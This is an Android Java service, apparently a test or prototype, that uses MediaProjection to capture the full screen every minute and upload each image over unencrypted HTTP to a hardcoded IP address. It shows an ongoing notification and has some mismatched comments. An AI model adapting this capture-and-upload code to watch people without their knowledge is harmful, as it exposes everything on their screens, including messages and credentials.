package com.example.testjava;


import android.app.Service;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.util.Log;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.MultipartBody;
import okhttp3.MediaType;

import java.io.FileOutputStream;
import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;

import okhttp3.Response;

import java.io.File;
import java.util.UUID;
import java.util.concurrent.TimeUnit;

import androidx.core.app.NotificationCompat;

import java.nio.ByteBuffer;

public class ScreenshotService extends Service {
    @Override
    public IBinder onBind(Intent intent) {
        return null;              // «привязка» не поддерживается
    }
    private static final String ENDPOINT =
            "http://195.133.66.252:8000/api/v1/settings/screenshots";

    private static final String CHAN = "screenshot_chan";
    private MediaProjection projection;
    private ImageReader reader;
    private Handler h;
    private Runnable tick;

    String token      = "YOUR_JWT_TOKEN";
    String txnId      = UUID.randomUUID().toString();

    String deviceId   = "Kiril_huesos";

    private MediaProjection.Callback mpCb;

    @Override public void onCreate() {
        super.onCreate();

        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(
                    CHAN, "Screenshot", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }

        startForeground(2, new NotificationCompat.Builder(this, CHAN)
                .setContentTitle("Скриншоты активны")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setOngoing(true)
                .build());
    }

    @Override public int onStartCommand(Intent i, int f, int id) {

        /* 1. Получаем токен, который дала система */
        int    res  = i.getIntExtra("resultCode", 0);
        Intent data = i.getParcelableExtra("resultData");

        MediaProjectionManager mpm =
                (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        projection = mpm.getMediaProjection(res, data);

        mpCb = new MediaProjection.Callback() {
            @Override public void onStop() {
                Log.w("SHOT_FLOW", "MediaProjection остановлена системой");
                stopSelf();                     // корректно закрываем сервис
            }
        };

        projection.registerCallback(mpCb, new Handler(Looper.getMainLooper()));

        /* 2. Настраиваем виртуальный экран */
        DisplayMetrics dm = getResources().getDisplayMetrics();
        reader = ImageReader.newInstance(
                dm.widthPixels, dm.heightPixels,
                PixelFormat.RGBA_8888, 1);

        projection.createVirtualDisplay(
                "scr_cap", dm.widthPixels, dm.heightPixels, dm.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                reader.getSurface(), null, null);

        /* 3. Периодический снятие кадров */
        h = new Handler(Looper.getMainLooper());
        tick = () -> {
            captureOnce();
            h.postDelayed(tick, 60_000);   // каждые 5 минут
        };
        h.post(tick);

        return START_STICKY;
    }

    private void captureOnce() {
        Log.d("SHOT", "make-shot @ " +
                android.text.format.DateFormat.format("HH:mm:ss", System.currentTimeMillis()));
        Image img = null;
        try {
            img = reader.acquireLatestImage();
            if (img == null) return;

            int w = img.getWidth(), h = img.getHeight();
            Image.Plane p = img.getPlanes()[0];
            ByteBuffer buf = p.getBuffer();

            Bitmap bmp = Bitmap.createBitmap(
                    w, h, Bitmap.Config.ARGB_8888);
            bmp.copyPixelsFromBuffer(buf);

            bmp = Bitmap.createScaledBitmap(
                    bmp,
                    w / 2,
                    h / 2,
                    true);

            File out = new File(getCacheDir(), "shot_" +
                    System.currentTimeMillis() + ".jpg");
            try (FileOutputStream fos = new FileOutputStream(out)) {
                bmp.compress(Bitmap.CompressFormat.JPEG, 75, fos);
            } catch (IOException e) {
                Log.e("SHOT", "save error", e);
                return;
            }

            /* --- отправляем или сохраняем --- */
            Log.d("SHOT", "отправка пошла");
            uploadToServer(out);

        } catch (Exception ex) {
            Log.e("SHOT", ex.toString());
        } finally {
            if (img != null) img.close();
        }
    }

    private final OkHttpClient http = new OkHttpClient.Builder()
            .callTimeout(30, TimeUnit.SECONDS)     // 30 с на запрос
            .build();

    /** отправляем PNG на backend */
    private void uploadToServer(File shot) {

        /* ---------- 1. создаём HTTP-клиент (один раз на весь класс лучше в поле) ----- */
        OkHttpClient http = new OkHttpClient.Builder()
                .callTimeout(30, TimeUnit.SECONDS)          // 30 с на весь обмен
                .build();

        /* ---------- 2. multipart/form-data с полем “file” --------------------------- */
        RequestBody fileBody = RequestBody.create(
                shot,
                MediaType.parse("image/png"));              // MIME-тип

        RequestBody form = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", shot.getName(), fileBody)
                .addFormDataPart("category",        "asdasd")
                .addFormDataPart("transaction_id", txnId)
                .addFormDataPart("device_id",       deviceId)

                .build();

        /* ---------- 3. POST https://…/upload ---------------------------------------- */
        Request req = new Request.Builder()
                .url(ENDPOINT)
                .addHeader("Authorization", "Bearer " + token)
                .post(form)
                .build();

        /* ---------- 4. асинхронно отправляем (enqueue) ------------------------------ */
        http.newCall(req).enqueue(new Callback() {

            @Override public void onFailure(Call c, IOException e) {
                Log.e("SHOT_UP", "upload FAIL", e);         // сеть недоступна / TLS-ошибка …
            }

            @Override public void onResponse(Call c, Response r) {
                Log.d("SHOT_UP", "server code " + r.code()); // 200? 400?
                r.close();

                if (r.isSuccessful()) {
                    boolean ok = shot.delete();             // чистим кеш
                    Log.d("SHOT_UP", "cache delete " + ok);
                }
            }
        });
    }


    @Override public void onDestroy() {
        if (projection != null) projection.stop();
        if (reader != null) reader.close();
        super.onDestroy();
    }


}

